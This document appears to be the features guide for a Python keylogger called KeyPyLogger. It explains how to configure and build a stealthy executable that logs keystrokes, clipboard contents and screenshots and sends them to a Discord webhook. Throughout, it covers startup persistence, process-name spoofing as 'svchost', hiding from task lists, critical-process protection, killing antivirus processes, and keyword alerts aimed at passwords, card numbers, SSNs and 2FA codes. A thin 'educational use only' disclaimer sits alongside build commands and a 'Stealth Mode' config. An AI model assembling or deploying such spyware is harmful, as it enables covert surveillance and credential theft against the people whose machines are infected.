# 🚀 KeyPyLogger - Advanced Features Guide

This document details the advanced features available in KeyPyLogger v2.0.

## 📋 Table of Contents

- [Overview](#overview)
- [Available Versions](#available-versions)
- [Advanced Features](#advanced-features)
- [Configuration](#configuration)
- [Usage Examples](#usage-examples)
- [Building Advanced Executables](#building-advanced-executables)

---

## Overview

KeyPyLogger now comes in two versions:

1. **Basic Version**: Simple keylogger with Discord webhook integration
2. **Advanced Version**: Enhanced keylogger with multiple advanced surveillance features

---

## Available Versions

### Basic Version

**Location**:
- Windows: `src/windows/keylogger_windows.py`
- Linux: `src/linux/keylogger_linux.py`

**Features**:
- Keyboard input capture
- Discord webhook integration
- System information collection
- Periodic log sending

### Advanced Version

**Location**:
- Windows: `src/windows/keylogger_windows_advanced.py`
- Linux: `src/linux/keylogger_linux_advanced.py`

**Features**:
- All basic features PLUS:
- Clipboard monitoring
- Screenshot capture
- Keyword alerts
- Persistence mechanisms
- Self-protection
- Health monitoring
- Process watchdog

---

## Advanced Features

### 1. Persistence (Windows & Linux)

Automatically ensures the program runs on system startup.

**Windows Methods**:
- Startup folder shortcut
- Registry Run key
- Scheduled tasks
- Service installation (requires admin)

**Linux Methods**:
- Systemd service
- Cron @reboot
- Init.d script
- Autostart desktop file

**Configuration**:
```python
ENABLE_PERSISTENCE = True
PROGRAM_NAME = "SystemUpdate"  # Name shown in startup
```

### 2. Clipboard Monitoring

Captures everything copied to the clipboard.

**Features**:
- Real-time clipboard monitoring
- Configurable check intervals
- Sends clipboard data to Discord
- Filters duplicate content

**Configuration**:
```python
ENABLE_CLIPBOARD = True
```

**Dependencies**: `pyperclip>=1.8.2`

### 3. Screenshot Capture

Periodically captures screenshots of the active display.

**Features**:
- Configurable capture interval
- Automatic image compression
- Sends images to Discord webhook
- Cross-platform compatibility

**Configuration**:
```python
ENABLE_SCREENSHOTS = True
SCREENSHOT_INTERVAL = 300  # 5 minutes
```

**Dependencies**:
- `Pillow>=10.4.0`
- `pyscreenshot>=3.1` (Linux only)

### 4. Keyword Alerts

Triggers alerts when specific keywords are detected.

**Features**:
- Multiple preset keyword lists
- Custom keyword lists
- Context capture around keywords
- Real-time alerts to Discord

**Preset Lists**:
- `FINANCIAL`: Credit card numbers, banking terms
- `CREDENTIALS`: Passwords, usernames, tokens
- `PERSONAL`: SSN, addresses, phone numbers
- `SECURITY`: Security questions, 2FA codes
- `CUSTOM`: Your own keyword list

**Configuration**:
```python
ENABLE_KEYWORD_ALERTS = True
KEYWORD_LISTS = ['financial', 'credentials']  # Use preset lists

# Or add custom keywords in modules/keyword_alerts.py
```

### 5. Self-Protection

Protects the program from detection and termination.

**Windows Features**:
- Hide console window
- Set process to critical (BSOD on kill)
- Hide from task list
- Process name spoofing

**Linux Features**:
- Process name spoofing
- Hide from ps commands
- Protect process from signals

**Configuration**:
```python
ENABLE_SELF_PROTECTION = True
```

**⚠️ WARNING**: Critical process protection can make your system unstable!

### 6. Health Monitoring

Monitors program health and system status.

**Features**:
- Periodic health checks
- System resource monitoring
- Crash detection and reporting
- Automatic status updates to Discord

**Configuration**:
```python
ENABLE_HEALTH_MONITORING = True
```

### 7. Process Watchdog

Monitors for specific processes (like antivirus, task manager).

**Features**:
- Detect security tools
- Alert on specific process launch
- Optional process termination
- Configurable process blacklist

---

## Configuration

### Basic Configuration

Edit the configuration section in the advanced keylogger files:

```python
# ============================================================================
# CONFIGURATION - EDIT THESE VALUES BEFORE USE/COMPILING
# ============================================================================
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"
SEND_INTERVAL = 60  # Send logs every 60 seconds
MAX_BUFFER_SIZE = 1000  # Maximum characters before forcing send

# Advanced Features Configuration
ENABLE_PERSISTENCE = False
ENABLE_CLIPBOARD = False
ENABLE_SCREENSHOTS = False
SCREENSHOT_INTERVAL = 300  # 5 minutes
ENABLE_KEYWORD_ALERTS = False
KEYWORD_LISTS = []  # e.g., ['financial', 'credentials']
ENABLE_SELF_PROTECTION = False
ENABLE_HEALTH_MONITORING = False
PROGRAM_NAME = "SystemUpdate"
# ============================================================================
```

### Enable All Features

```python
ENABLE_PERSISTENCE = True
ENABLE_CLIPBOARD = True
ENABLE_SCREENSHOTS = True
SCREENSHOT_INTERVAL = 180  # 3 minutes
ENABLE_KEYWORD_ALERTS = True
KEYWORD_LISTS = ['financial', 'credentials', 'personal']
ENABLE_SELF_PROTECTION = True
ENABLE_HEALTH_MONITORING = True
PROGRAM_NAME = "WindowsUpdate"
```

---

## Usage Examples

### Example 1: Basic Keylogging with Clipboard

```python
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
SEND_INTERVAL = 60
ENABLE_CLIPBOARD = True
# All other features disabled
```

**Run**:
```bash
# Windows
python src/windows/keylogger_windows_advanced.py

# Linux
python3 src/linux/keylogger_linux_advanced.py
```

### Example 2: Full Surveillance Suite

```python
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
SEND_INTERVAL = 30
ENABLE_PERSISTENCE = True
ENABLE_CLIPBOARD = True
ENABLE_SCREENSHOTS = True
SCREENSHOT_INTERVAL = 300
ENABLE_KEYWORD_ALERTS = True
KEYWORD_LISTS = ['financial', 'credentials']
ENABLE_HEALTH_MONITORING = True
PROGRAM_NAME = "SystemService"
```

### Example 3: Stealth Mode (Windows)

```python
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
ENABLE_PERSISTENCE = True
ENABLE_SELF_PROTECTION = True
ENABLE_HEALTH_MONITORING = True
PROGRAM_NAME = "svchost"  # Mimic Windows service
```

---

## Building Advanced Executables

### Using the Advanced Builder

The advanced builder (`tools/builder_advanced.py`) provides a graphical interface to:
- Select which features to enable
- Configure all settings
- Build a standalone executable
- Automatically replace configuration values

**Usage**:
```bash
python tools/builder_advanced.py
```

**Builder Features**:
- ✅ Discord webhook validation
- ✅ Feature toggles for all advanced features
- ✅ Custom program name
- ✅ Keyword list selection
- ✅ PyInstaller integration
- ✅ Automatic configuration injection
- ✅ One-click executable creation

**Output**:
- Executable: `build/dist/[ProgramName].exe` (Windows)
- All modules automatically included
- No external dependencies required

### Manual Building

If you prefer manual configuration:

1. Edit the advanced keylogger file directly
2. Set your webhook and desired features
3. Use PyInstaller:

```bash
# Windows
pyinstaller --onefile --noconsole \
  --add-data "modules;modules" \
  --name "YourProgram" \
  src/windows/keylogger_windows_advanced.py

# Linux
pyinstaller --onefile \
  --add-data "modules:modules" \
  --name "your-program" \
  src/linux/keylogger_linux_advanced.py
```

---

## Dependencies for Advanced Features

Install all dependencies:
```bash
pip install -r requirements.txt
```

**Core Dependencies**:
- `pynput>=1.7.6` - Keyboard monitoring
- `requests>=2.31.0` - Webhook communication

**Advanced Dependencies**:
- `pyperclip>=1.8.2` - Clipboard monitoring
- `Pillow>=10.4.0` - Screenshot capture
- `psutil>=5.9.0` - Process monitoring
- `pywin32>=306` - Windows-specific features
- `setproctitle>=1.3.0` - Linux process spoofing

**Optional**:
- `pyinstaller>=6.0.0` - Building executables

---

## Security Considerations

### Educational Use Only

These advanced features are designed for:
- ✅ Cybersecurity education
- ✅ Authorized penetration testing
- ✅ Security research in controlled environments
- ✅ Understanding surveillance techniques

### Dangers of Advanced Features

⚠️ **WARNING**:
- **Persistence**: May be difficult to remove if you forget where it's installed
- **Self-Protection**: Can make your system unstable (especially critical process mode)
- **Screenshots**: Generate large amounts of data
- **Clipboard**: May capture sensitive data unintentionally

### Best Practices

1. **Always test in a virtual machine first**
2. **Document your configuration**
3. **Keep track of persistence locations**
4. **Never use on systems you don't own**
5. **Disable self-protection during development**
6. **Use responsible disclosure for security research**

---

## Troubleshooting

### Modules Not Found

```bash
# Ensure modules directory is in Python path
export PYTHONPATH="${PYTHONPATH}:/path/to/KeyPyLogger"

# Or install in development mode
pip install -e .
```

### Persistence Not Working

- **Windows**: Check if running with administrator privileges
- **Linux**: Check systemd logs: `journalctl -u [service-name]`

### Screenshots Failing

- **Windows**: Ensure Pillow is installed: `pip install Pillow>=10.4.0`
- **Linux**: May need X11 access: `xhost +local:`

### Clipboard Not Monitoring

- **Linux**: Install xclip: `sudo apt-get install xclip`
- Check if pyperclip is installed: `pip install pyperclip`

---

## Module Details

Each module is located in the `modules/` directory:

- `clipboard.py` - Clipboard monitoring implementation
- `screenshot.py` - Screenshot capture functionality
- `keyword_alerts.py` - Keyword detection system
- `persistence.py` - Persistence mechanisms for Windows/Linux
- `protection.py` - Self-protection features
- `watchdog.py` - Process monitoring and health checks

All modules are designed to fail gracefully if dependencies are missing.

---

## License & Responsibility

This project is provided under the MIT License for educational purposes only.

**YOU ARE RESPONSIBLE FOR**:
- Ensuring legal compliance in your jurisdiction
- Obtaining proper authorization before testing
- Using these tools ethically and responsibly
- Any consequences of misuse

**THE AUTHOR IS NOT RESPONSIBLE FOR**:
- Illegal use of this software
- Damage caused by improper use
- Violations of privacy laws
- Unauthorized surveillance

---

## Contributing

We welcome contributions that:
- Improve educational value
- Add security research features
- Enhance detection evasion understanding
- Improve code quality and documentation

Please ensure all contributions maintain the educational focus of this project.

---

## Support

For questions about advanced features:
1. Check this documentation first
2. Review the module source code (`modules/`)
3. Check the builder configuration (`tools/builder_advanced.py`)
4. Open an issue on GitHub with detailed information

---

**Remember: With great power comes great responsibility. Use these tools wisely and legally.**
